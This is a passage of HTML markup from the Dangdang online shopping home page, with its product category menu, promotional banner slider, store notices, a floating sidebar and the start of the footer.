            </li>
                        <li class="n_b"  dd_name="美妆个人护理成人"  id="li_label_10" data-submenu-id="__ddnav_sort10" data_index="10" data_key="34122" data_type="'goods'" >
                <span class="nav" id="categoryh_10">
                    <a name="newcate10" dd_name="美妆"  id="cate_37332" href="http://cosmetic.dangdang.com/" target="_blank">美妆</a>、<a name="newcate10" dd_name="个人护理"  id="cate_54231" href="http://cosmetic.dangdang.com/" target="_blank">个人护理</a>、<a name="newcate10" dd_name="成人"  id="cate_54230" href="http://sex.dangdang.com/" target="_blank">成人</a></span><span class="sign"></span>
            </li>
                        <li class="n_b"  dd_name="食品茶酒生鲜"  id="li_label_11" data-submenu-id="__ddnav_sort11" data_index="11" data_key="34152" data_type="'goods'" >
                <span class="nav" id="categoryh_11">
                    <a name="newcate11" dd_name="食品"  id="cate_40152" href="http://food.dangdang.com/" target="_blank">食品</a>、<a name="newcate11" dd_name="茶酒"  id="cate_53794" href="http://food.dangdang.com/alcohol" target="_blank">茶酒</a>、<a name="newcate11" dd_name="生鲜"  id="cate_40162" href="http://food.dangdang.com/fresh" target="_blank">生鲜</a></span><span class="sign"></span>
            </li>
                        <li class="n_b"  dd_name="腕表珠宝饰品眼镜"  id="li_label_12" data-submenu-id="__ddnav_sort12" data_index="12" data_key="34222" data_type="'goods'" >
                <span class="nav" id="categoryh_12">
                    <a name="newcate12" dd_name="腕表"  id="cate_54859" href="http://fashion.dangdang.com/watch" target="_blank">腕表</a>、<a name="newcate12" dd_name="珠宝饰品"  id="cate_45542" href="http://fashion.dangdang.com/jewelry" target="_blank">珠宝饰品</a>、<a name="newcate12" dd_name="眼镜"  id="cate_53122" href="http://category.dangdang.com/cid4009587.html" target="_blank">眼镜</a></span><span class="sign"></span>
            </li>
                        <li class="n_b"  dd_name="手机数码"  id="li_label_13" data-submenu-id="__ddnav_sort13" data_index="13" data_key="34162" data_type="'goods'" >
                <span class="nav" id="categoryh_13">
                    <a name="newcate13" dd_name="手机"  id="cate_41592" href="http://3c.dangdang.com/mobile" target="_blank">手机</a>、<a name="newcate13" dd_name="数码"  id="cate_41602" href="http://3c.dangdang.com/digital" target="_blank">数码</a></span><span class="sign"></span>
            </li>
                        <li class="n_b"  dd_name="电脑办公"  id="li_label_14" data-submenu-id="__ddnav_sort14" data_index="14" data_key="34172" data_type="'goods'" >
                <span class="nav" id="categoryh_14">
                    <a name="newcate14" dd_name="电脑办公"  id="cate_42602" href="http://3c.dangdang.com/pc" target="_blank">电脑办公</a></span><span class="sign"></span>
            </li>
                        <li class="n_b"  dd_name="家用电器"  id="li_label_15" data-submenu-id="__ddnav_sort15" data_index="15" data_key="34182" data_type="'goods'" >
                <span class="nav" id="categoryh_15">
                    <a name="newcate15" dd_name="家用电器"  id="cate_44162" href="http://3c.dangdang.com/appliance" target="_blank">家用电器</a></span><span class="sign"></span>
            </li>
                        <li class="n_b"  dd_name="当当礼品卡生活服务"  id="li_label_16" data-submenu-id="__ddnav_sort16" data_index="16" data_key="54895" data_type="'goods'" >
                <span class="nav" id="categoryh_16">
                    <a name="newcate16" dd_name="当当礼品卡"  id="cate_54896" href="http://giftcard.dangdang.com/" target="_blank">当当礼品卡</a>、<a name="newcate16" dd_name="生活服务"  id="cate_55733" href="http://category.dangdang.com/cid11618.html" target="_blank">生活服务</a></span><span class="sign"></span>
            </li>
                        <!--<li class="all" id="li_label_all" data-submenu-id="__ddnav_all"  data_index="15" data_key="" data_type=""><span class="nav"><a href="http://category.dangdang.com/?ref=www-0-C#ref=www-0-C">全部商品分类</a></span></li>-->
                    </ul>
                <div class="new_pub_nav_pop" style="display: none;" id="__ddnav_sort1"></div>
                <div class="new_pub_nav_pop" style="display: none;" id="__ddnav_sort2"></div>
                <div class="new_pub_nav_pop" style="display: none;" id="__ddnav_sort3"></div>
                <div class="new_pub_nav_pop" style="display: none;" id="__ddnav_sort4"></div>
                <div class="new_pub_nav_pop" style="display: none;" id="__ddnav_sort5"></div>
                <div class="new_pub_nav_pop" style="display: none;" id="__ddnav_sort6"></div>
                <div class="new_pub_nav_pop" style="display: none;" id="__ddnav_sort7"></div>
                <div class="new_pub_nav_pop" style="display: none;" id="__ddnav_sort8"></div>
                <div class="new_pub_nav_pop" style="display: none;" id="__ddnav_sort9"></div>
                <div class="new_pub_nav_pop" style="display: none;" id="__ddnav_sort10"></div>
                <div class="new_pub_nav_pop" style="display: none;" id="__ddnav_sort11"></div>
                <div class="new_pub_nav_pop" style="display: none;" id="__ddnav_sort12"></div>
                <div class="new_pub_nav_pop" style="display: none;" id="__ddnav_sort13"></div>
                <div class="new_pub_nav_pop" style="display: none;" id="__ddnav_sort14"></div>
                <div class="new_pub_nav_pop" style="display: none;" id="__ddnav_sort15"></div>
                <div class="new_pub_nav_pop" style="display: none;" id="__ddnav_sort16"></div>
            </div>
</div>

</div><script type="text/javascript" src="http://www.dangdang.com/Standard/Framework/Extend/hosts/js/categorydata_new.js?20170531"></script><script src="http://www.dangdang.com/Standard/Framework/Extend/hosts/js/dd.menu-aim.js?20170531" charset="gb2312" type="text/javascript"></script>
                    <script type="text/javascript">ddmenuaim(document.getElementById("menulist_content"),{activate: activateSubmenu,deactivate: deactivateSubmenu});</script>
                    <script type="text/javascript">initHeaderOperate();Suggest_Initialize("key_S");</script>
        <div class="home_circle_c" ddt-area="focus" ddt-expose="on"><div class="focus_box hover" id="f" dd_name="焦点图" ddt-area="focus_b" ddt-expose="on"><div class="btn btn_l" style="left: -46px; z-index: 10;" id="btn_l">left</div><div class="btn btn_r" style="right: -46px; z-index: 10;" id="btn_r">right</div><div id="slidecontentbox" style="overflow: hidden;"><ul class="pic" id="slidecontent"><li style="position: absolute; opacity: 0; z-index: 1;" ddt-expose="attr[z-index='9']"><textarea style="display:none"> <a href="http://a.dangdang.com/tjump.php?q=fxb7PB2JtY%2Bw3J6uDI8tlJ8JODcvkAknxfrLg47OC%2FrtdMZa46t9%2BwL1I1cBjcgk1FO6QHfy4HhxWOIFkVHDGQHSGv2sl1Boxl3nOejJuPnSAAT506WC4vUBaNyU9JGgsej" name="f_1" dd_name="焦点图6" title="" target="_blank">
                            <img src="http://a.dangdang.com/api/data/cpx/img/39470001/1" width="772" height="310">
                        </a> </textarea></li><li style="position: absolute; opacity: 0; z-index: 1;" ddt-expose="attr[z-index='9']"><textarea style="display:none"> <a href="http://a.dangdang.com/tjump.php?q=ftgksGLeaILLiB3wRyQgA8EXODcvkAknxfrLg47OC%2FrtdN1sDA%2BnybcHCYegvryk58cuYmcZnGfPauWxHXCFWjZkNoaK3LlEbvtd4PxwWGU98s%3D" name="f_1" dd_name="焦点图0" title="" target="_blank">
                            <img src="http://a.dangdang.com/api/data/cpx/img/39290001/1" width="772" height="310">
                        </a> </textarea></li><li style="position: absolute; opacity: 0; z-index: 1;" ddt-expose="attr[z-index='9']"><textarea style="display:none"> <a href="http://a.dangdang.com/tjump.php?q=fkegM6pF4qxydRjg0GDLaKrlODcvkAknxfrLg47OC%2FrtdN1sDA%2BnybcHCYegvryk58ckNsO%2FoLvARSeu36SyO9uJk3jJV8FDnKVtPBu0bpP3I7ESzGTdkvFvvAJUHpj%2FHNr" name="f_1" dd_name="焦点图4" title="" target="_blank">
                            <img src="http://a.dangdang.com/api/data/cpx/img/39410001/1" width="772" height="310">
                        </a> </textarea></li><li style="position: absolute; opacity: 0; z-index: 1;" ddt-expose="attr[z-index='9']"><textarea style="display:none"> <a href="http://a.dangdang.com/tjump.php?q=fnnsZthdiAp0mMuH6HeL2vzdODcvkAknxfrLg47OC%2FrtdPSKlCcBFPdw49ZwG96wS6lJ3%2BxM8LgH2eQlgG%2B8pAPMyXBDSgKLHLInrNuMuUMjQmbZnIq2U%2B4BQ8Rj7XtYxxYJVk7U0kMIeQPg18paLrju%2FKNjibNUDgMyDSX05avmCuuUmMP69FtGvEWIDLmQZ%2F1fF5Xu7em5AdQTas1J3uD%2FUxAQwOfOkhOLMqWlcMCEuZDXYYHP75BouMwPBQBx7ftPv8ybnO3pCLnVff7v%2Fw0Eg%3D%3D" name="f_1" dd_name="焦点图3" title="" target="_blank">
                            <img src="http://a.dangdang.com/api/data/cpx/img/39380001/1" width="772" height="310">
                        </a> </textarea></li><li style="position: absolute; opacity: 0; z-index: 1;" ddt-expose="attr[z-index='9']"><textarea style="display:none"> <a href="http://a.dangdang.com/tjump.php?q=fbqTL8UyjmUQ%2BfOyOIxH2apG%2BDcvkAknxfrLg47OC%2FrtdNGwnmO2weMNYXzfOTIEEiZEhM2f9HtAQexiyJXmLoVCuhakAQatyHVJCbEJ3dNeqmLZ8BAhp%2FZOXoYbsOU7XiA" name="f_1" dd_name="焦点图1" title="" target="_blank">
                            <img src="http://a.dangdang.com/api/data/cpx/img/39320001/1" width="772" height="310">
                        </a> </textarea></li><li style="position: absolute; opacity: 0; z-index: 1;" ddt-expose="attr[z-index='9']"><textarea style="display:none"> <a href="http://a.dangdang.com/tjump.php?q=fhj2suaQprTHZAoXhbFL4JZxODcvkAknxfrLg47OC%2FrtdOXwIODcaC%2Fnu86vP3QeDZmMSvj2bfqHuw0FRoBPEl9vGxAmJ32v07e9R9Yu144cx0%3D" name="f_1" dd_name="焦点图5" title="" target="_blank">
                            <img src="http://a.dangdang.com/api/data/cpx/img/39440001/1" width="772" height="310">
                        </a> </textarea></li><li style="position: absolute; opacity: 0; z-index: 1;" ddt-expose="attr[z-index='9']"><textarea style="display:none"> <a href="http://a.dangdang.com/tjump.php?q=fgvCPxY1Pbi5IXOEzzxUIxqV%2BDcvkAknxfrLg47OC%2FrtdP%2FDpUqEInC8Kz59l8oybGTyozDGvBBXdMKsgO70phCyvYO5C5pXfjDdtkbAo7BIA%2FF97qTTMFYItSvbH1C6EfD" name="f_1" dd_name="焦点图7" title="" target="_blank">
                            <img src="http://a.dangdang.com/api/data/cpx/img/39500001/1" width="772" height="310">
                        </a> </textarea></li><li style="position: absolute; opacity: 0; z-index: 1;" ddt-expose="attr[z-index='9']"><textarea style="display:none"> <a href="http://a.dangdang.com/tjump.php?q=flgfqrNAlZhvBMfAdy8NG5ZPODcvkAknxfrLg47OC%2FrtdP%2FDpUqEInC8Kz59l8oybGTAWsWCBLWQR4iL8138tqulJuHW1K%2B1NypZxxQete1S%2FXRG6%2B4XTeqKpAp8%2B1DIJWg" name="f_1" dd_name="焦点图2" title="" target="_blank">
                            <img src="http://a.dangdang.com/api/data/cpx/img/39350001/1" width="772" height="310">
                        </a> </textarea></li></ul></div>
                            <ul class="tab" id="slidelabel_nav" style="z-index:10;" dd_name="巨幕翻页"><li class = 'on'>1</li><li class = ''>2</li><li class = ''>3</li><li class = ''>4</li><li class = ''>5</li><li class = ''>6</li><li class = ''>7</li><li class = ''>8</li>
                            </ul></div><div class="tehui_box" id="bzth" ddt-area="focus_s" ddt-expose="on"><div class="btn btn_l" id="c_left" style="left: -46px;">left</div><div class="btn btn_r" id="c_right" style="right: -46px;">right</div><div id="tehui" dd_name="焦点小图"><ul id="Cbanner" style="width: 12000px; position: absolute; z-index:9; opacity:1" ddt-expose="attr[z-index='9']"><textarea style="display:none" ddt-expose="attr[z-index='9']"><li><a href="http://a.dangdang.com/tjump.php?q=fpxoEsz6UYTCvJhw25huBSf%2BODcvkAknxfrLg47OC%2FrtdP%2FDpUqEInC8Kz59l8oybGTyozDGvBBXdMKsgO70phCylBtF0qume9Uz%2FlGigCymwT4KowZpNXToOG8Fu6bSJNt" target="_blank" title="" name="bzth_4" dd_name="本周特惠1"><img src="http://a.dangdang.com/api/data/cpx/img/39990004/1" width="192" height="172" title = "" alt=""><span class="cover"></span></a></li><li><a href="http://a.dangdang.com/tjump.php?q=fccCbwq525FXF2HhI42ZOwseuDcvkAknxfrLg47OC%2FrtdOXwIODcaC%2Fnu86vP3QeDZmMSvj2bfqHuw0FRoBPEl9vOF4rudQMGCRwYBgOga%2F5HY%3D" target="_blank" title="" name="bzth_4" dd_name="本周特惠5"><img src="http://a.dangdang.com/api/data/cpx/img/39990003/1" width="192" height="172" title = "" alt=""><span class="cover"></span></a></li><li><a href="http://a.dangdang.com/tjump.php?q=fwylm3U90yXs3jHkWqaTxbquODcvkAknxfrLg47OC%2FrtdP6bMXIOVvGTc3fhmTzF595Q8cUM0ZX2AEjYyf9KALG5bevIpcULc1ljNOXvIZyQJo%3D" target="_blank" title="" name="bzth_4" dd_name="本周特惠4"><img src="http://a.dangdang.com/api/data/cpx/img/39990001/1" width="192" height="172" title = "" alt=""><span class="cover"></span></a></li><li><a href="http://a.dangdang.com/tjump.php?q=fimXC0yw0304ZsVlR38UxlrLODcvkAknxfrLg47OC%2FrtdN1sDA%2BnybcHCYegvryk58cYrC%2Bl%2B8jLaa2JOVTPP7mzWSXEVJwuh2X5LOyeN2Vxuw8UaudZVj3ege5NMly1ncs" target="_blank" title="" name="bzth_4" dd_name="本周特惠2"><img src="http://a.dangdang.com/api/data/cpx/img/39900002/1" width="192" height="172" title = "" alt=""><span class="cover"></span></a></li></textarea></ul><ul id="Cbanner" style="width: 12000px; position: absolute; z-index:1; opacity:0" ddt-expose="attr[z-index='9']"><textarea style="display:none" ddt-expose="attr[z-index='9']"><li><a href="http://a.dangdang.com/tjump.php?q=fxr3NqRjo56A3CRZTbrRuUCaODcvkAknxfrLg47OC%2FrtdN1sDA%2BnybcHCYegvryk58cmvTpK1BZ%2FCi9u3tDEk533pGncyX9KmIl7wkby8%2B3%2BAbpYo6rwS3v2eBSn8dHoO70" target="_blank" title="" name="bzth_4" dd_name="本周特惠3"><img src="http://a.dangdang.com/api/data/cpx/img/39900003/1" width="192" height="172" title = "" alt=""><span class="cover"></span></a></li><li><a href="http://a.dangdang.com/tjump.php?q=fpturUu%2FiIAgCp0LVlUZTxhdeDcvkAknxfrLg47OC%2FrtdP%2FDpUqEInC8Kz59l8oybGTjbJlcd4p8drcaVEXRHbP5IJ7L9pjbgLCufSZHVy8t0P4KowZpNXToOG8Fu6bSJNt" target="_blank" title="" name="bzth_4" dd_name="本周特惠0"><img src="http://a.dangdang.com/api/data/cpx/img/39900004/1" width="192" height="172" title = "" alt=""><span class="cover"></span></a></li><li><a href="http://a.dangdang.com/tjump.php?q=fcbWgpHyY8G9te4qgJRGuEb4eDcvkAknxfrLg47OC%2FrtdN1sDA%2BnybcHCYegvryk58c%2F%2FJQkriEy0ngvqjTnPyIXWCoAafUFviWz0vrDUHS%2FDjRG6%2B4XTeqKpAp8%2B1DIJWg" target="_blank" title="" name="bzth_4" dd_name="本周特惠6"><img src="http://a.dangdang.com/api/data/cpx/img/39900001/1" width="192" height="172" title = "" alt=""><span class="cover"></span></a></li><li><a href="http://a.dangdang.com/tjump.php?q=ffoG7ZobFV5hn2ya5CdpTIBseDcvkAknxfrLg47OC%2FrtdNGwnmO2weMNYXzfOTIEEiZEhM2f9HtAQexiyJXmLoVCjAsKO5J88Np4Y1n66RTslav3wTC7Ho9gC%2BJQpwxguuL" target="_blank" title="" name="bzth_4" dd_name="本周特惠7"><img src="http://a.dangdang.com/api/data/cpx/img/39990002/1" width="192" height="172" title = "" alt=""><span class="cover"></span></a></li></textarea></ul></div></div></div>        <div  class="home_notice_r "  name="m3208532_pid9282_t15653"    ><div  class="home_notice_r_pic "  name="m3208532_pid9282_9267_t15654"    >
            <a   class=" _1  pic"   ddt-area="9266" ddt-expose="on"  href="http://a.dangdang.com/api/data/cpx/link/39530001/1"  title="" target="_blank"  nname="mixpage-317715-15640_2_1"  dd_src=""   dd_name="首屏大模块A版_公告图"><img  src="http://a.dangdang.com/api/data/cpx/img/39530001/1"    ddt-pit="1"/></a>         </div>                    <div class="home_notice_gg " id="component_map_id_3208532_part_id_9268"   name=m3208532_pid9282_9273_p9268    js="true" itemclass="" action="hover" delay="0" speed='5000'  rand='0' area='0' barclass='on'  updown='1' level="2" ddt-area="9268" ddt-expose="on">
                        <div class="head  headhome_notice_gg"  >
        <ul class="tab_aa">
                                    <li class=" tabh_0  on first " type="bar"><span>信息公告</span></li>
                                                        <li class=" tabh_1 " type="bar" ><a href="http://blog.dangdang.com/?page_id=3382" target="_blank" dd_name="服务公告"><span>服务公告</span></a></li>
                                                                </ul>
         

</div>                    <div class="tab_content_aa tab_content_aahome_notice_gg ">
                                                                <div class="content tab_1" type="item" ddt-area="9270" ddt-expose="on" dd_name="信息公告">
                                            <div id="logo_content" >
    <ul id="cxgg_content">
      <li>
        <a href="http://baby.dangdang.com/20170524_kjjz" target="_blank" title="乐高凯知乐大牌联合" dd_name="信息公告1">
            <span  > 乐高凯知乐大牌联合</span>
        </a>
      </li>
      <li>
        <a href="http://art.dangdang.com/#component_2735524" target="_blank" title="儿童文具满100减50" dd_name="信息公告2">
            <span  > 儿童文具满100减50</span>
        </a>
      </li>
      <li>
        <a href="http://e.dangdang.com/special_page.html?stId=2273" target="_blank" title="百部经典小说 名家汇聚" dd_name="信息公告3">
            <span  > 百部经典小说 名家汇聚</span>
        </a>
      </li>
      <li>
        <a href="http://fashion.dangdang.com/20170522_clothes" target="_blank" title="服装跨店每满100减50" dd_name="信息公告4">
            <span  > 服装跨店每满100减50</span>
        </a>
      </li>
      <li>
        <a href="http://book.dangdang.com/" target="_blank" title="全场图书满100减50" dd_name="信息公告5">
            <span  > 全场图书满100减50</span>
        </a>
      </li>
    </ul>
</div>
                                        </div>
                                                                                <div class="content tab_2" type="item" style="display: none" ddt-area="9272" ddt-expose="on" dd_name="服务公告">
                                            <div id="logo_content" >
    <ul id="cxgg_content">
      <li>
        <a href="http://t.dangdang.com/20160830_uonv" target="_blank" title="积分支付上线了，直接当钱用！" dd_name="服务公告1">
            <span  > 积分支付上线了，直接当钱用！</span>
        </a>
      </li>
      <li>
        <a href="http://book.dangdang.com/20161128_zl3t" target="_blank" title="当当阅读器 海量电子书随时读" dd_name="服务公告2">
            <span  > 当当阅读器 海量电子书随时读</span>
        </a>
      </li>
      <li>
        <a href="http://blog.dangdang.com/?p=26143" target="_blank" title="六一活动期间订单配送通知" dd_name="服务公告3">
            <span  > 六一活动期间订单配送通知</span>
        </a>
      </li>
      <li>
        <a href="http://blog.dangdang.com/?p=26007" target="_blank" title="自营商品满39包邮啦！" dd_name="服务公告4">
            <span  > 自营商品满39包邮啦！</span>
        </a>
      </li>
      <li>
        <a href="http://blog.dangdang.com/?p=22276" target="_blank" title="关于假冒客服诈骗的声明" dd_name="服务公告5">
            <span style="color: #ff2832" > 关于假冒客服诈骗的声明</span>
        </a>
      </li>
    </ul>
</div>
                                        </div>   
                                                            </div>                
                        
              </div>
             
    <div class="roll_aa " id="mapid_3208532_parent_9282_10047_part_10047" marquee="true"    name=m3208532_pid9282_10047_p10047           js="true" action="newclickroll" delay="500" prevnoneclass="btn_prev_none" nextnoneclass="btn_next_none" 
         page="0"  speed="5000" display_count="1" is_display_tab="1" noend="1"
         ddt-area="10047" ddt-expose="on">
        
        
                
                     <div class="btn_brand_prev" type="rollpre"></div>
        <div class="btn_brand_next" type="rollnext"></div>
                    <ul class="mix_marquee_tab">
            </ul>
                    <div class="over">
                            <ul class="list_aa" style="left:0;" type="rollbox">
                    <li type="rollitem"><a   class=" _1  pic"   ddt-area="10044" ddt-expose="on"  href="http://art.dangdang.com/#component_2735524"  title="" target="_blank"  nname="mixpage-317715-15640_2_1"  dd_src=""   dd_name="首屏大模块A版_右下banner图_TAB1"><img  src="http://img63.ddimg.cn/upload_img/00626/sxt11/0530benyou.jpg"    ddt-pit="1"/></a> </li><li type="rollitem"><a   class=" _1  pic"   ddt-area="10045" ddt-expose="on"  href="http://book.dangdang.com/"  title="图书" target="_blank"  nname="mixpage-317715-15640_2_1"  dd_src=""   dd_name="首屏大模块A版_右下banner图_TAB2"><img  src="http://img61.ddimg.cn/upload_img/00087/hw/tab_lyx_0527.jpg"    title='图书'  alt='图书'  ddt-pit="1"/></a> </li><li type="rollitem"><a   class=" _1  pic"   ddt-area="10046" ddt-expose="on"  href="http://giftcard.dangdang.com/"  title="礼品卡" target="_blank"  nname="mixpage-317715-15640_2_1"  dd_src=""   dd_name="首屏大模块A版_右下banner图_TAB3"><img  src="http://img62.ddimg.cn/upload_img/00549/cuxiao/dangshoudw.jpg"    title='礼品卡'  alt='礼品卡'  ddt-pit="1"/></a> </li>                </ul>
                        </div>
    </div>
    </div></div>
</div><div  class=" "    name="m4530621_pid0_t16031" dd_name="背景图"   hvid='20159'   component_map_id="4530621" ddt-area="4530621" ddt-expose="on" ><div id='component_4530621'></div>
                    <!-- use cache--><div id='component_4530621'></div><style>
        #bd {
        background-image: url(http://img61.ddimg.cn/upload_img/00459/home/618bg6.jpg);
        background-repeat: no-repeat;
        background-position: center top;
    }
    </style>
</div><div  class="home_taday_flash_box "  id="block2"  type='ajax' page_id='317715' domain='mixpage.dangdang.com' areaid='0' page_type='3' areatype='0'   name="m4162651_pid0_t15008" dd_name="秒杀和厂商周A版"   hvid='16956'   component_map_id="4162651" ddt-area="4162651" ddt-expose="on" ><div id='component_4162651'></div></div><div  class="book_new "   type='ajax' page_id='317715' domain='mixpage.dangdang.com' areaid='0' page_type='3' areatype='0'   name="m3208542_pid0_t15677" dd_name="图书A版"   hvid='20227'   component_map_id="3208542" ddt-area="3208542" ddt-expose="on" ><div id='component_3208542'></div></div><div  class="floor_tall "   type='ajax' page_id='317715' domain='mixpage.dangdang.com' areaid='0' page_type='3' areatype='0'   name="m3201755_pid0_t15641" dd_name="服装A版"   hvid='20148'   component_map_id="3201755" ddt-area="3201755" ddt-expose="on" ><div id='component_3201755'></div></div><div  class="motherbaby_toy "   type='ajax' page_id='317715' domain='mixpage.dangdang.com' areaid='0' page_type='3' areatype='0'   name="m4056726_pid0_t15706" dd_name="日用百货A版"   hvid='20222'   component_map_id="4056726" ddt-area="4056726" ddt-expose="on" ><div id='component_4056726'></div></div><div  class="dd_brand "   type='ajax' page_id='317715' domain='mixpage.dangdang.com' areaid='0' page_type='3' areatype='0'   name="m3208540_pid0_t15670" dd_name="自有品牌A版"   hvid='20234'   component_map_id="3208540" ddt-area="3208540" ddt-expose="on" ><div id='component_3208540'></div></div><div  class="cywj_img5 "   type='ajax' page_id='317715' domain='mixpage.dangdang.com' areaid='0' page_type='3' areatype='0'   name="m4362899_pid0_t15961" dd_name="创意文具A版"   hvid='20191'   component_map_id="4362899" ddt-area="4362899" ddt-expose="on" ><div id='component_4362899'></div></div><div  class="preg_baby_floor "   type='ajax' page_id='317715' domain='mixpage.dangdang.com' areaid='0' page_type='3' areatype='0'   name="m3208549_pid0_t15690" dd_name="孕婴童A版"   hvid='20195'   component_map_id="3208549" ddt-area="3208549" ddt-expose="on" ><div id='component_3208549'></div></div><div  class="v_all "   type='ajax' page_id='317715' domain='mixpage.dangdang.com' areaid='0' page_type='3' areatype='0'   name="m3208536_pid0_t15661" dd_name="尾品汇A版"   hvid='20235'   component_map_id="3208536" ddt-area="3208536" ddt-expose="on" ><div id='component_3208536'></div></div><div  class="home_screen_cai "  id="guess_like"  type='ajax' page_id='317715' domain='mixpage.dangdang.com' areaid='0' page_type='3' areatype='0'   name="m4226998_pid0_t15895" dd_name="猜你喜欢A版"   hvid='18054'   component_map_id="4226998" ddt-area="4226998" ddt-expose="on" ><div id='component_4226998'></div></div><div  class=" "    name="m3208563_pid0_t15049" dd_name="左侧电梯A版"   hvid='18947'   component_map_id="3208563" ddt-area="3208563" ddt-expose="on" ><div id='component_3208563'></div>
                    <!-- use cache--><div id='component_3208563'></div><div  class="con "  name="m3208563_pid0_t15050"    ><div class="fix_box" id="navigation" style="display:none;">
    <ul class="fix_screen_list">
                    <li><a class="f1" rel="component_3208542"><span>图书</span></a></li>
                        <li><a class="f13" rel="component_3201755"><span>服装</span></a></li>
                        <li><a class="f14" rel="component_4056726"><span>日用百货</span></a></li>
                        <li><a class="f7" rel="component_3208549"><span>孕婴童</span></a></li>
                        <li><a class="f15" rel="component_4226998"><span>猜你喜欢</span></a></li>
                </ul>
</div>
<style>
    .broaden{
        -webkit-transform: scale(1.2); transform: scale(1.2); opacity: 0; -webkit-transition: all 0.3s ease; transition: all 0.3s ease; filter:alpha(opacity=0);
    }

    .reduce{
        -webkit-transform: scale(1); transform: scale(1); opacity: 1; -webkit-transition: all 0.3s ease; transition: all 0.3s ease; filter:alpha(opacity=100);
    }

</style></div>
</div><div  class=" "    name="m3208565_pid0_t15324" dd_name="右浮动条A版"   hvid='20106'   component_map_id="3208565" ddt-area="3208565" ddt-expose="on" ><div id='component_3208565'></div>
                    <!-- use cache--><div id='component_3208565'></div><div  class="con "  name="m3208565_pid0_t15325"    ><div class="sidebar_wrap" id="sidebar_wrap_id" ddt-area="ad_r" ddt-expose="on">
    <div class="sidebar">
                 
            <div class="sale">
                                        <a href="http://coupon.dangdang.com" target="_blank"  dd_name="活动图片小图" ddt-pit="1" ddt-expose="on">
                            <img class="right_ad_pic"  src="http://img61.ddimg.cn/2016/11/1/2016110120354244376.hpiabBPM" width="34" height="135"/>
                        </a>
                                        
            </div>
            
        <div class="sidebar_top">
            <a href="http://shopping.dangdang.com/shoppingcart/shopping_cart.aspx" class="cart" target="_blank" dd_name="购物车"><span>购物车</span><em style="text-align: center"></em></a>
            <a href="javascript:void(0)" class="collect" dd_name="我的收藏"><span class="name">我的收藏</span></a>
            <a href="javascript:void(0)" class="footprint" dd_name="我的浏览"><span class="name" style="left: 0px;">我的浏览</span></a>
            <a href="http://point.dangdang.com/index.html" target="_blank" class="sidebar_points" dd_name="我的积分"><span class="name">我的积分</span></a>
            <a href="javascript:void(0)" class="robot" dd_name="咨询小当家"><span class="name">咨询小当家</span></a>
        </div>

        <div class="sidebar_b">
            <div class="sidebar_code2">
                <a href="javascript:void(0)" class="code2s"></a>
                <a href="" class="code2b" style="display:none"><img src="http://img62.ddimg.cn/f9229d67-4b33-47a6-b3b4-3a0490d513c7.hpMg2KFb" /></a>
            </div>
            <a href="javascript:void(0);" class="back_top" dd_name="返回顶部"><span class="name">返回顶部</span></a>
            <a href="http://survey.dangdang.com/html/2487.html" class="survey" target="_blank" dd_name="意见反馈"><span class="name">意见反馈</span></a>
            <span class="guanggao">广告</span>
        </div>
    </div>

    <!-- 右侧面板 -->
    <div class="sidebar_open"  id="my_collect" style="display:none">

    </div>
    <div class="sidebar_open" id="my_history" style="display:none">
    </div>
    <div class="sidebar_open" id="expand_content" style="display:none">
    </div>
    <div class="sidebar_open" id="robot" style="display:none">
    </div>

    <!--右侧广告内容-->
    <div id="expand_content_hidden" style="display:none">
            </div>

    <div id="collect_load_html" style="display:none">
        <h4><a href="javascript:sidebar_open_close()" class="close">close</a>我的收藏</h4><div class="sidebar_loading"><p>加载中请稍后</p><p><img src="http://img60.ddimg.cn/upload_img/00111/home/loading.gif"></p></div>
    </div>
    
    <div id="history_load_html" style="display:none">
        <h4><a href="javascript:sidebar_open_close()" class="close">close</a>我浏览过的商品</h4><div class="sidebar_loading"><p>加载中请稍后</p><p><img src="http://img60.ddimg.cn/upload_img/00111/home/loading.gif"></p></div>
    </div>

    <div id="robot_load_html" style="display:none">
        <h4><a href="javascript:sidebar_open_close()" class="close">close</a>咨询小当家</h4><div class="sidebar_loading"><p>加载中请稍后</p><p><img src="http://img60.ddimg.cn/upload_img/00111/home/loading.gif"></p></div>
    </div>

<script>
    var float_right_ajax_url = '/Standard/Framework/Core/hosts/get_right_float_data.php';
    var collect_url = 'http%3A%2F%2Fwish.dangdang.com%2Fwishlist%2Fcust_wish_list.aspx';
    var robot_url = 'http://faqrobot.dangdang.com/robot/dangpc.html?sysNum=dd_1000';
</script>




</div>
</div><div  class=" "    name="m3208566_pid0_t15083"     component_map_id="3208566" ddt-area="3208566" ddt-expose="on" ><div id='component_3208566'></div>
                    <!-- use cache--><div id='component_3208566'></div><div  class="con "  name="m3208566_pid0_t15084"    ></div>
</div><div  class="mix_search_top "    name="m3208567_pid0_t15272" dd_name="吸顶搜索A版"   hvid='14332'   component_map_id="3208567" ddt-area="3208567" ddt-expose="on" ><div id='component_3208567'></div>
                    <!-- use cache--><div id='component_3208567'></div><div  class="con mix_search"  name="m3208567_pid0_t15273"    ><div  class="con logo"  id="33578" name="m3208567_pid0_t15274"    ><a   class=" _1  pic"   ddt-area="8534" ddt-expose="on"  href="http://www.dangdang.com/"  title="" target="_blank"  nname="mixpage-317715-15640_19_1"  dd_src="hpuWMccm_981472e135a6b0df"   dd_name="吸顶搜索A版_LOGO"><img  src="http://img63.ddimg.cn/6980a660-38bd-4629-a74e-c79c7c2db431.hpuWMccm"    ddt-pit="1" ddt-src="hpuWMccm_981472e135a6b0df"/></a> </div><div  class="con search"  id="33579" name="m3208567_pid0_t15275"    ><div>
    <input id="stickSearchKey" type="text"></input>
    <a href="javascript:void(0);" id="goStickSearch" onclick="stickSearch()"   >search</a>
</div>
</div><div  class="con 33580"  id="33580" name="m3208567_pid0_t15276"    ><ul class="list" ><li   nname="mixpage-317715-15640_19_1" class="line line1 on"  ddt-area="8536" ddt-expose="on" ddt-pit="1" ddt-expose="on">
                          <a  dd_name="吸顶搜索A版_消息列表"  dd_src="dangicon"   href="http://www.dangdang.com" target="_blank" ddt-src="dangicon"class="" title=""></a> </li></ul></div></div>
</div></div></div>
<script>var curr_area_id = "205";</script><div  id="footer_html" is_loaded="0" style="min-width: 1200px;">

<div     >
    <!--此ID为开始标识，不能删除--><div id="footer">
<div class="footer" dd_name="页尾">
    <div class="footer_pic_new">
        <div class="footer_pic_new_inner">
            <a name="foot_1" href="http://help.dangdang.com/details/page13" target="_blank" class="footer_pic01"><span>正规渠道正品保障</span></a>
            <a name="foot_2" class="footer_pic02" href="http://help.dangdang.com/details/page21" target="_blank"><span>放心购物货到付款</span></a>
            <a name="foot_3" class="footer_pic03" href="http://help.dangdang.com/details/page16" target="_blank"><span>150城市次日送达</span></a>
